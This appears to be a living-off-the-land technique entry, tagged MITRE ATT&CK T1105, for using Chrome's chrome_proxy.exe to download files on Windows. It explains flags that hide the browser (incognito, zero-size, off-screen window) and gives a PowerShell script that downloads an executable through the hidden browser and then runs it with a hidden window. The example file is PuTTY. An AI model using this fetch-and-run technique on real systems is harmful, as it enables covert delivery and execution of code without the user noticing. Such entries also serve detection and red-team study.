#Usecase: Download file from the internet
#Privileges required: User
#OS: Windows 10, Windows 11
#MITRE ATT&CKÂ®: T1105: Ingress Tool Transfer
#Chrome will launch in Incognito mode and download the file. 

'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe': This specifies the location of the Chrome executable file, which may vary depending on your system configuration.

--profile-directory=Default: This flag selects the default profile directory for the Chrome user profile.

--incognito: This flag enables the incognito mode, which allows browsing without storing any browsing history or cookies.

--chrome-frame: This flag enables the use of Chrome Frame, an Internet Explorer plugin that adds Chrome's rendering capabilities to IE.

--user-data-dir=C:\Temp\Temp-chrome\: This flag specifies a custom directory to store user-specific data, such as cache, cookies, and session information.

--window-size=0,0: This flag sets the window size of the Chrome window to 0 pixels by 0 pixels, effectively minimizing it.

--window-position="0000,1000": This flag sets the window position of the Chrome window to coordinates (0, 1000), which may be offscreen depending on your monitor setup.

<URL>: This placeholder indicates where you would normally provide the URL of the file you want to download.

#Command:
#& 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe'  --profile-directory=Default --incognito --chrome-frame --user-data-dir= C:\Temp\Temp-chrome\ --window-size=0,0 --window-position="0000,1000" <URL>


$chromePath = "C:\Program Files\Google\Chrome\Application\chrome_proxy.exe"
$chromeArgs = "--profile-directory=Default", "--incognito", "--chrome-frame", "--user-data-dir= C:\Temp\tmp-chrome" , "--window-size=7,7", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
$exePath = "C:/Users/$($env:USERNAME)/Downloads/<file name>"

# Start Chrome with the downloaded file
Start-Process -FilePath $chromePath -ArgumentList $chromeArgs -WindowStyle Hidden

# Wait for Chrome to launch
Start-Sleep -Seconds 20

# Start the downloaded file
Start-Process -FilePath $exePath -WindowStyle Hidden
